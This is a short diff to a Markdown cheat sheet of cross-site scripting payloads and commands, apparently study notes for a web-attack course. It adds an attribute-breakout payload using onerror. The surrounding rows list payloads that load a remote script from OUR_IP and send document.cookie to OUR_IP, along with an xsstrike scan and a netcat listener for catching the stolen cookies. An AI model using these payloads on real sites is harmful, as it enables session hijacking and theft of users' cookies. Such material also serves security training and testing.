@@ -20,6 +20,7 @@
 | `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
 | `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
 | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
+| `src='" onerror=alert(window.origin)> <br"`                                                   |                                   |
 | **Commands**                                                                                  |                                   |
 | `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
 | `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
